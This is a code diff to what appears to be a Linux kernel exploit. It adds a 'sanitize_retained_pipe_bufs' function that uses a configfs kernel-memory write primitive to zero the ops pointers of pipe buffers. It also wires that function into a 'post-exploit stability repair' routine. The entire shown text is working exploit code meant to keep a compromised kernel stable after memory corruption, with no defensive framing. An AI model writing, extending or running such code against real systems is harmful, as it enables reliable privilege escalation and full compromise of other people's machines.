@@ -499,6 +499,29 @@ static void repair_p0_pipe_corruption(int fd) {
 }
 #endif
 
+static void sanitize_retained_pipe_bufs(int fd) {
+  if (!pipebuf_addr || !pipebuf_page_base) {
+    return;
+  }
+  uintptr_t obj_off =
+      ((pipebuf_addr - pipebuf_page_base) / PIPE_OBJECT_SIZE) *
+      PIPE_OBJECT_SIZE;
+  uintptr_t bufs_base = pipebuf_page_base + obj_off;
+  int zeroed = 0;
+  for (int i = 0; i < PIPE_BUFFER_SLOTS; i++) {
+    uintptr_t ops_addr = bufs_base +
+        i * sizeof(struct user_pipe_buffer) +
+        offsetof(struct user_pipe_buffer, ops);
+    uint64_t zero = 0;
+    if (configfs_write_once(fd, ops_addr, &zero, sizeof(zero)) ==
+        (ssize_t)sizeof(zero)) {
+      zeroed++;
+    }
+  }
+  pr_info("pipe-sanitize: retained bufs=%016zx zeroed=%d/%d\n",
+          bufs_base, zeroed, PIPE_BUFFER_SLOTS);
+}
+
 static void run_post_exploit_repair(int fd) {
   pr_info("post-repair: ========================================\n");
   pr_info("post-repair: POST-EXPLOIT STABILITY REPAIR\n");
@@ -514,6 +537,8 @@ static void run_post_exploit_repair(int fd) {
     defined(P0_ORACLE_GATE_OBJECT_INDEX)
   repair_p0_pipe_corruption(fd);
 #endif
+
+  sanitize_retained_pipe_bufs(fd);
 
   pr_info("post-repair: ========================================\n");
   pr_info("post-repair: REPAIR COMPLETE\n");
